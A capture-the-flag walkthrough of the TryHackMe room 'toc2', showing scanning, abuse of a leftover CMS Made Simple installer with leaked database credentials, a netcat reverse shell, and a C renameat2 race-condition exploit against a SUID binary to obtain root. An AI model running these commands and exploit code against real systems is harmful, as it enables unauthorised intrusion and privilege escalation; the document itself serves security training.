<h1 align="center">toc2</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/f5aa704f-13cb-45c8-979d-852243886ec6"><br>
2025, September 6<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>488</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>It's a setup... Can you get the flags in time?</em>.<br>
Access it <a href="https://tryhackme.com/room/toc2"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/a98bff4f-1db6-4b31-b665-12ef97b33634"></p>

<h2>Task 1 . Get Connected</h2>
<p>Welcome,<br>

In order to complete this room, you will need to connect to the TryHackMe OpenVPN, details for which can be found at: https://tryhackme.com/access.<br>

Remember when deploying the virtual machine, it can take up to 5 minutes to properly boot up. Good luck, happy hacking.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Connect to the TryHackMe OpenVPN<br>
<code>No answer needed</code></p>

<h2>Task 2 . Exploit the Machine</h2>
<p>I have a theory that the truth is never told during the nine-to-five hours. - Hunter S. Thompson</p>

<p><em>Answer the questions below</em></p>

<h2>nikto</h2>

<p>

- /cmsms/cmsms-2.1.6-install.php in robots.txt<br>

</p>

```bash
:~# nikto -h xx.xxx.xx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        80
+ Start Time:         2025-09-06 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x316 0x5ad16bb7d7380 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ File/dir '/cmsms/cmsms-2.1.6-install.php' in robots.txt returned a non-forbidden or redirect HTTP code (301)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ 6544 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-09-06 xx:xx:xx (GMT1) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>nmap</h2>

<p>

- 22:ssh, 80:http:cmsms 2.1.6<br>
- robots.txt<br>
- /cmsms/cmsms-2.1.6-install.php</p>

```bash
:~# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xxx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/cmsms/cmsms-2.1.6-install.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site Maintenance
```

<h2>gobuster</h2>

```bash
:~# gobuster dir -u http://xx.xxx.xx.xxx/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://xx.xxx.xx.xxx/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 790]
/robots.txt           (Status: 200) [Size: 174]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```


<h2>Web port 80</h2>

<p>

- HUNTER<br>
- Under Construction<br>
- Sorry for the inconvenience but management have once again asked for more than we can deliver.<br>
- the web server isn't going to be ready for the web dev team to build on for another few days. Just in case anyone around here except me wants to do anything: cmsmsuser:devpass</p>

<img width="1059" height="453" alt="image" src="https://github.com/user-attachments/assets/ddbea15f-5ead-44c9-9bf9-2367a8199470" />

<br>

<img width="1068" height="393" alt="image" src="https://github.com/user-attachments/assets/343f7fdc-0f4e-4e68-8ac7-0672643223a0" />

<br>
<h2>/robots.txt</h2>
<p>

- Disallow: /cmsms/cmsms-2.1.6-install.php<br>
- Tommorow, finish setting up the CMS, and that database, cmsmsdb, so the site's ready by Wednesday.</p>

<img width="1057" height="206" alt="image" src="https://github.com/user-attachments/assets/db826a53-e82a-42df-b0f2-da98edb18134" />


<br>
<h2>/cmsms/cmsms-2.1.6-install.php</h2>
<p>

- CMS Made Simple\u2122 2.1.6</p>

<img width="899" height="823" alt="image" src="https://github.com/user-attachments/assets/be87b2cb-37b3-453c-a2e5-dd74c07c58aa" />

<br>

<img width="1057" height="104" alt="image" src="https://github.com/user-attachments/assets/080e1050-0fd6-4c59-8a8a-12b332f27405" />


<img width="1083" height="347" alt="image" src="https://github.com/user-attachments/assets/f2b880db-fe63-4940-b198-2f8465e59f3c" />

<img width="1040" height="123" alt="image" src="https://github.com/user-attachments/assets/d866418b-aa80-4e62-bdc6-7420f5831069" />



<h2>http://xx.xxx.xx.xxx1/cmsms/cmsms-2.1.6-install.php</h2>

<img width="1072" height="733" alt="image" src="https://github.com/user-attachments/assets/315d2c61-4115-41f9-8a58-272a0b93c30d" />


<p>

- Next</p>

<img width="1055" height="660" alt="image" src="https://github.com/user-attachments/assets/9b7d347b-16b4-4c4c-bc2a-3a034588b5d7" />

<p>

- Install</p>

<img width="1047" height="614" alt="image" src="https://github.com/user-attachments/assets/2c6d0784-fb13-4ea3-912b-2790516c9cf3" />


<h2>http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php</h2>

<img width="1057" height="674" alt="image" src="https://github.com/user-attachments/assets/a06e9da2-a0c9-414e-b32c-8a6053e4c34c" />


<br>
<p>

- launched Burp Suite<br>
- enabled FoxyProxy<br>
- Next</p>


```bash
POST /cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=4 HTTP/1.1
Host: xx.xxx.xx.xxx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://xx.xxx.xx.xxx
Connection: keep-alive
Referer: http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=4
Cookie: CMSICc5e817ada6=**************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i

dbhost=localhost&dbname=cmsmsdb&dbuser=cmsmsuser&dbpass=devpass&timezone=UTC&next=Next+%E2%86%92
```

```bash
HTTP/1.1 302 Found
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=5
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


```

<br>



admin
rose@mail
password123!

<img width="1045" height="611" alt="image" src="https://github.com/user-attachments/assets/0d1da2c5-02c5-4442-a9ef-bebbafdad7b1" />

```bash
POST /cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=5 HTTP/1.1
Host: xx.xxx.xx.xxx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: http://xx.xxx.xx.xxx
Connection: keep-alive
Referer: http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=5
Cookie: CMSICc5e817ada6=**************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&emailaddr=rose%40mail.com&password=password123%21&repeatpw=password123%21&next=Next+%E2%86%92
```

```bash
HTTP/1.1 302 Found
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=6
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


```


<h2>Step 6</h2>

<img width="1068" height="684" alt="image" src="https://github.com/user-attachments/assets/94e91f62-80fe-4172-abb2-ca018a8ac02a" />

```bash
POST /cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=6 HTTP/1.1
Host: xx.xxx.xx.xxx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://xx.xxx.xx.xxx
Connection: keep-alive
Referer: http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=6
Cookie: CMSICc5e817ada6=*************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i

sitename=Ethical&languages%5B%5D=pt_BR&next=Next+%E2%86%92
```

```bash
HTTP/1.1 302 Found
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: http://xx.xxx.xx.xxxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=7
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


```


<h2>Step 7 - Install Application Files</h2>
<p>

- Next</p>


<img width="1058" height="590" alt="image" src="https://github.com/user-attachments/assets/62d5ed50-4231-458f-9b0c-168e1039b33e" />

```bash
GET /cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=8 HTTP/1.1
Host: xx.xxx.xx.xxx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=7
Cookie: CMSICc5e817ada6=**************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 7151

        <!DOCTYPE html>
<!--[if IE 8]>         <html lang="en" class="lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en"> <!--<![endif]-->
    <head>
        <base href="/cmsms/cmsms-2.1.6-install.php/"/>        <meta charset="utf-8">
        <meta name='HandheldFriendly' content='True' />
        <meta name='MobileOptimized' content='320' />
        <meta name='viewport' content='width=device-width, initial-scale=1.0' />
        <meta http-equiv='cleartype' content='on' />
        <script src="app/assets/vendor/jquery-1.11.2.min.js"></script>
        <script src="app/assets/vendor/jquery-ui/jquery-ui.min.js"></script>
        <link rel="stylesheet" type="text/css" href="app/assets/vendor/jquery-ui/jquery-ui.min.css"/>
        <title>Creating a new CMSMS 2.1.6 website - CMS Made Simple&trade; Installation and upgrade assistant</title>
...
```


<h2>Step 8 - Creating a new CMSM 2.1.6 website</h2>
<p>

- Next</p>

<img width="1061" height="722" alt="image" src="https://github.com/user-attachments/assets/b6d55708-92ad-414c-89a0-150265d43ba0" />

```bash
GET /cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=9 HTTP/1.1
Host: xx.xxx.xx.xxx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xxx.xx.xxx/cmsms/cmsms-2.1.6-install.php/index.php?m26e63ad8=8
Cookie: CMSICc5e817ada6=****************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 7781

        <!DOCTYPE html>
<!--[if IE 8]>         <html lang="en" class="lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en"> <!--<![endif]-->
 ...
```

<h2>Step 9 - Finish</h2>

<img width="1055" height="695" alt="image" src="https://github.com/user-attachments/assets/44773dbf-2d52-4e73-ad6d-ac52d493d7c0" />

<h2>http://xx.xxx.xx.xxx/cmsms/admin/login.php</h2>


<img width="1070" height="538" alt="image" src="https://github.com/user-attachments/assets/72917781-183f-4bc3-ac82-12118fe50b0c" />

<br>

<img width="1066" height="514" alt="image" src="https://github.com/user-attachments/assets/f842f4db-3395-4000-913c-79acb4668c26" />


<br>
<h2>www-data</h2>

```bash
:~/toc2# nc -nlvp 1234
...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@...:/$ ^Z
[1]+  Stopped                 nc -nlvp 1234
:~/toc2# stty raw -echo; fg
nc -nlvp 1234

www-data@...:/$ export TERM=xterm
www-data@...:/$ pwd
/
www-data@...:/$ cd home
www-data@...:/home$ ls
frank  ubuntu
www-data@...:/home$ cd frank
www-data@...:/home/frank$ ls
new_machine.txt  root_access  user.txt
www-data@...:/home/frank$ cat user.txt
thm{****************************}
www-data@...:/home/frank$ 
```

<br>
<p>2.1. Find and retrieve the user.txt flag<br>
<code>thm{****************************}</code></p>
<br>


```bash
www-data@...:/home/frank$ cat new_machine.txt
I'm gonna be switching computer after I get this web server setup done. The inventory team sent me a new Thinkpad, the password is "password". It's funny that the default password for all the work machines is something so simple...Hell I should probably change this one from it, ah well. I'm switching machines soon- it can wait. 
```

<br>
<h2>frank  .  Session 1</h2>

```bash
www-data@...:/home/frank/root_access$ su frank
Password: 
frank@...:~/root_access$ 
```

```bash
frank@...:~/root_access$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

```bash
frank@...:~/root_access$ ll
total 52
drwxr-xr-x 2 frank frank  4096 Sep  7 00:00 ./
drwxr-xr-x 5 frank frank  4096 Sep  6 23:57 ../
-rwsr-xr-x 1 root  root   8704 Jan 31  2021 readcreds*
-rw-r--r-- 1 root  root    656 Jan 31  2021 readcreds.c
-rw------- 1 root  root     34 Aug 23  2020 root_password_backup
```

```bash
frank@...:~/root_access$ cat readcreds.c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
	exit(1);
    }

    if (!access(argv[1],R_OK)) {
	    sleep(1);
	    file_data = open(argv[1], O_RDONLY);
    } else {
	    fprintf(stderr, "Cannot open %s \n", argv[1]);
	    exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);

}
```


```bash
frank@...:~/root_access$ wget http://xx.xxx.xx.xxx:8000/rename.c
...
rename.c                            100%[===================================================================>]     295  --.-KB/s    in 0s      
```

```bash
frank@...:~/root_access$ cat rename.c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

```bash
frank@...:~$ ls
new_machine.txt  root_access  user.txt
```

```bash
frank@...:~$ cd root_access
```

```bash
frank@...:~/root_access$ ls
readcreds  readcreds.c  rename.c  root_password_backup
```

```bash
frank@...:~/root_access$ gcc rename.c -o rename
```

```bash
frank@...:~/root_access$ touch anything
```

```bash
frank@...:~/root_access$ ./rename anything root_password_backup
```

<h2>frank  .  Session 2</h2>

```bash
frank@...:~/root_access$ ./readcreds root_password_backup
Root Credentials:  root:******** 
```


<img width="978" height="72" alt="image" src="https://github.com/user-attachments/assets/bed72e6c-baa2-4d8f-bab3-8e9c412dadda" />

<br>
<br>

```bash
frank@...:~/root_access$ su root
Password:
```

```bash
root@...:/home/frank/root_access# cd /root
root@...:~# ls
root.txt  snap
```

```bash
root@...:~# cat root.txt
thm{****************}
```

<br>
<p>2.1. Escalate your privileges and acquire root.txt<br>
<code>thm{****************}</code></p>


<br>

<h2>Task 3 . </h2>
<p>LiveOverflow has an amazing video exploring this kind of vulnerability, as well as how to remediate it which you can find here. I thoroughly recommend checking it out if you're having trouble visualising how this kind of race condition works and how to properly exploit it:<br>

https://www.youtube.com/watch?v=5g137gsB9Wk<br>

The Wikipedia entry for this kind of vulnerability is also extremely useful, and provides similar examples in C of how this vulnerability can occur and be exploited for leveraging privileges.<br>

Have a great day, stay safe.<br>

~  Polo<br>

<p><em></em>Answer the questions below</em></p>

<p>3.1. I now understand where to find more information on this kind of vulnerability.<br>
<code>No answer needed</code></p>

<br>

<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7fcbbe94-1589-424c-8976-03f38664182c"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/46078e63-e1ce-4491-b543-cee5930168c6"></p>

<h2 align="center">My TryHackMe Journey</h2>

<div align="center">

| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
| 2025, Sep 6       |Medium 🚩 - <code>toc2</code>            | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |

</div>

<br>

<p align="center">Global All Time:   114ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/e3bea599-de7b-46da-9a69-e13bcee47c3f"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/8c54aafb-d95e-4e25-bd29-af335627d6c2"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/9f9d665f-a157-4803-b452-05d27077c744"><br>
                  Global monthly:    695ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/4138ac50-3f50-454c-9481-acdf3e5ad3f5"><br>
                  Brazil monthly:     12ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/24a3c273-f947-4b42-971a-f1642caabbc1"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
